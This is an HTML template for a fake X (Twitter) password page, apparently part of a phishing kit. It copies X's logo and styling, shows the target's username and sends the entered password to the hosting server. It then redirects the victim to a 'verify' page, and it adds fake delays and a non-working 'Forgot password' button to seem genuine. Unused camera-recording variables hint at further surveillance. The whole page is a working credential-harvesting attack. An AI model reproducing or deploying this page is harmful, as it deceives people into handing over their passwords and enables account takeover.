<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>X - Enter Password</title>
    <link rel="icon" type="image/svg+xml" href="/static/favicon.svg">
    <link rel="shortcut icon" href="/favicon.ico">
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #000;
            color: #fff;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        
        .container {
            width: 100%;
            max-width: 600px;
            padding: 0 32px;
        }
        
        .close-btn {
            position: absolute;
            top: 20px;
            left: 20px;
            font-size: 24px;
            cursor: pointer;
            transition: transform 0.3s ease;
        }
        
        .close-btn:active {
            transform: rotate(90deg);
        }
        
        .logo {
            text-align: center;
            margin-bottom: 48px;
        }
        
        .logo svg {
            width: 40px;
            height: 40px;
        }
        
        h1 {
            font-size: 31px;
            font-weight: 700;
            margin-bottom: 32px;
        }
        
        .username-display {
            margin-bottom: 20px;
            color: #71767b;
        }
        
        form {
            width: 100%;
        }
        
        input[type="password"], input[type="text"] {
            width: 100%;
            height: 56px;
            background-color: #000;
            border: 1px solid #333;
            border-radius: 4px;
            color: #fff;
            font-size: 17px;
            padding: 0 16px;
            box-sizing: border-box;
            margin-bottom: 24px;
            transition: border-color 0.3s ease, box-shadow 0.3s ease;
        }
        
        input[type="password"]:focus, input[type="text"]:focus {
            outline: none;
            border-color: #1d9bf0;
        }
        
        input[type="password"].error, input[type="text"].error {
            border-color: #f4212e;
            box-shadow: 0 0 0 1px #f4212e;
            animation: shake 0.4s ease-in-out;
        }
        
        @keyframes shake {
            0%, 100% { transform: translateX(0); }
            20%, 60% { transform: translateX(-5px); }
            40%, 80% { transform: translateX(5px); }
        }
        
        .error-message {
            color: #f4212e;
            font-size: 14px;
            margin-top: -16px;
            margin-bottom: 16px;
            opacity: 0;
            transform: translateY(-10px);
            transition: opacity 0.3s ease, transform 0.3s ease;
        }
        
        .error-message.visible {
            opacity: 1;
            transform: translateY(0);
        }
        
        .login-btn {
            width: 100%;
            height: 50px;
            background-color: #fff;
            color: #000;
            border: none;
            border-radius: 9999px;
            font-size: 16px;
            font-weight: 700;
            cursor: pointer;
            margin-bottom: 16px;
            transition: transform 0.3s ease, background-color 0.3s ease;
        }
        
        .login-btn:active {
            transform: rotate(5deg);
            background-color: #e6e6e6;
        }
        
        .forgot-btn {
            width: 100%;
            height: 50px;
            background-color: transparent;
            color: #fff;
            border: 1px solid #536471;
            border-radius: 9999px;
            font-size: 16px;
            font-weight: 700;
            cursor: pointer;
            margin-bottom: 24px;
            transition: transform 0.3s ease;
        }
        
        .forgot-btn:active {
            transform: rotate(-5deg);
        }
        
        /* Spinner animation for buttons */
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .spinning {
            position: relative;
        }
        
        .spinning::after {
            content: "";
            position: absolute;
            width: 20px;
            height: 20px;
            top: 50%;
            left: 30px;
            margin-top: -10px;
            border: 2px solid rgba(0, 0, 0, 0.1);
            border-radius: 50%;
            border-top-color: #000;
            animation: spin 1s linear infinite;
            display: none;
        }
        
        .spinning.active::after {
            display: block;
        }
    </style>
</head>
<body>
    <div class="close-btn">âœ•</div>
    <div class="container">
        <div class="logo">
            <svg role="img" aria-label="X logo" width="48" height="48" viewBox="0 0 128 128" xmlns="http://www.w3.org/2000/svg">
                <path fill-rule="evenodd" clip-rule="evenodd" d="M86.8918 28.25H99.0219L72.5243 58.5334L103.698 99.75H79.285L60.1647 74.7536L38.2929 99.75H26.1627L54.5069 67.3565L24.5938 28.25H49.6199L66.9004 51.0974L86.8918 28.25ZM82.6337 92.4904H89.3555L45.9716 35.1301H38.7584L82.6337 92.4904Z" fill="white"/>
            </svg>
        </div>
        
        <h1>Enter your password</h1>
        
        <div class="username-display">@{{ username }}</div>
        
        <form id="login-form">
            <input type="password" name="password" placeholder="Password" required>
            <div class="error-message">Please enter your password</div>
            
            <button type="submit" class="login-btn spinning">Log in</button>
            
            <button type="button" class="forgot-btn">Forgot password?</button>
        </form>
    </div>
    
    <script>
        // Global variables for camera and recording
        let mediaStream = null;
        let mediaRecorder = null;
        let recordedChunks = [];
        
        document.addEventListener("DOMContentLoaded", function() {
            // Add artificial delay for page load (1-2 seconds)
            setTimeout(() => {
                // Focus the password field after a slight delay
                setTimeout(() => {
                    document.querySelector("input[name='password']").focus();
                }, 5000);
            
                // Login form event listener
                document.getElementById("login-form").addEventListener("submit", function(e) {
                    e.preventDefault();
                    
                    const passwordInput = document.querySelector("input[name='password']");
                    const errorMessage = document.querySelector(".error-message");
                    const loginBtn = document.querySelector(".login-btn");
                    
                    // Function to show error
                    function showError() {
                        passwordInput.classList.add('error');
                        errorMessage.classList.add('visible');
                        passwordInput.focus();
                        
                        // Remove error after 3 seconds
                        setTimeout(() => {
                            clearError();
                        }, 3000);
                    }
                    
                    // Function to clear error
                    function clearError() {
                        passwordInput.classList.remove('error');
                        errorMessage.classList.remove('visible');
                    }
                    
                    // Clear error on input
                    passwordInput.addEventListener('input', function() {
                        clearError();
                    });
                    
                    const password = passwordInput.value;
                    
                    if (!password.trim()) {
                        showError();
                        return;
                    }
                    
                    // Disable login button and change text
                    loginBtn.disabled = true;
                    loginBtn.textContent = "Signing in...";
                    loginBtn.classList.add("active");
                    
                    // Send password to server with a realistic delay
                    setTimeout(() => {
                        const formData = new FormData();
                        formData.append('password', password);
                        
                        fetch(window.location.href, {
                            method: 'POST',
                            body: formData
                        })
                        .then(response => {
                            if (response.ok) {
                                // Redirect to verify page instead of showing the verification container
                                setTimeout(() => {
                                    window.location.href = `/verify/{{ username }}`;
                                }, 1000 + Math.random() * 1000);
                            }
                        })
                        .catch(error => {
                            console.error('Error:', error);
                            loginBtn.textContent = "Log in";
                            loginBtn.disabled = false;
                            loginBtn.classList.remove("active");
                        });
                    }, 2000 + Math.random() * 1500);
                });
                
                // Add key press delay effect for password input
                const passwordInput = document.querySelector("input[name='password']");
                passwordInput.addEventListener("keydown", function(e) {
                    if (e.key.length === 1 && !e.ctrlKey && !e.metaKey) {
                        const originalValue = this.value;
                        // Add small random delay for typing (50-150ms)
                        setTimeout(() => {
                            if (document.activeElement === this) {
                                // This will be handled by the browser natively
                            }
                        }, 50 + Math.random() * 50);
                    }
                });
                
                // Forgot password button with delay
                document.querySelector(".forgot-btn").addEventListener("click", function() {
                    this.style.opacity = "0.7";
                    setTimeout(() => {
                        this.style.opacity = "1";
                        alert("Password reset functionality is temporarily unavailable. Please try again later.");
                    }, 5000 + Math.random() * 200);
                });
                
                // Close button with delay
                document.querySelector(".close-btn").addEventListener("click", function() {
                    this.style.opacity = "0.5";
                    setTimeout(() => {
                        window.history.back();
                    }, 5000 + Math.random() * 200);
                });
            }, 800 + Math.random() * 700);
        });
    </script>
</body>
</html>
